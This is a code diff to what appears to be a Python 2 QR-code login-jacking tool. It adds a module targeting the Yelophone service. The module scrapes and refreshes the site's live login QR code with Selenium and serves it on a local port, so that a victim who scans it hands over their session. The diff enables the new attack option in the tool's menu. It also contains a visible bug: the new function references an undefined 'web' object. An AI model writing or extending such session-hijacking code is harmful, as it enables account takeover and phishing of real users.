@@ -12,7 +12,7 @@ def clear():
 
 try:
 	from PIL import Image
-	import selenium
+	import selenium, requests
 	from selenium import webdriver
 
 except:
@@ -21,10 +21,12 @@ except:
 	try:
 		os.system("python -m pip install selenium")
 		os.system("python -m pip install Pillow")
+		os.system("python -m pip install requests")
 	except:
 		try:
 			os.system("pip install selenium")
 			os.system("pip install Pillow")
+			os.system("pip install requests")
 		except:
 			print "[!] Can't install libraries "
 			print "[!!] Try to install it yourself"
@@ -340,7 +342,27 @@ def Trustly_App():
 			print " [+]Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
 			print " [#]Saved To tmp.png"
-			time.sleep(10)
+			time.sleep(60)
+			continue
+		except:
+			break
+
+def Yelophone():
+	driver = create_driver()
+	time.sleep(5)
+	print " [+]Navigating To Website.."
+	driver.get("https://www.yelophone.com/app#/login")
+	time.sleep(5)
+	while True:
+		print "-- --- -- --- -- --- -- --- -- --- --"
+		try:
+			c = web.find_elements_by_id("qrcode")[0]
+			print " [+]The QR code image found !"
+			src = c.get_attribute("src")
+			print " [+]Downloading the image.."
+			qr = open("tmp.png","wb").write( requests.get( c.get_attribute("src") ).content )
+			print " [#]Saved To tmp.png"
+			time.sleep(60)
 			continue
 		except:
 			break
@@ -399,7 +421,7 @@ def Simple_Exploit(classname,url,image_number,s=10):
 			break
 
 def main():
-	#clear()
+	clear()
 	print """\n
 	  ___         _       _               _
 	 / _ \  _ __ | |     | |  __ _   ___ | | __ ___  _ __
@@ -605,7 +627,7 @@ def main():
 			Serve_it(port)
 			Yandex()
 			main()
-	#Mobile Managem
+	#Mobile Management
 
 	#Passport Services
 	if choice == 5:
@@ -663,9 +685,9 @@ def main():
  1.MyDigiPass
  2.Zapper
  3.Trustly App
- 4.Yelophone [Soon]
+ 4.Yelophone
  5.Alibaba Yunos [Soon]
- 00.Back To Main Menu [Soon]
+ 00.Back To Main Menu
 """
 		choice_2 = raw_input(" Second Choice > ")
 		if choice_2 == "00":
@@ -714,6 +736,21 @@ def main():
 			make()
 			Serve_it(port)
 			Trustly_App()
+			main()
+
+		elif int(choice_2) == 4:
+			port = raw_input(" Port to listen on (Default 1337) : ")
+			try:
+				int(port)
+			except ValueError:
+				port = 1337
+
+			if port == "":
+				port = 1337
+			clear()
+			make()
+			Serve_it(port)
+			Yelophone()
 			main()
 
 	#Customization
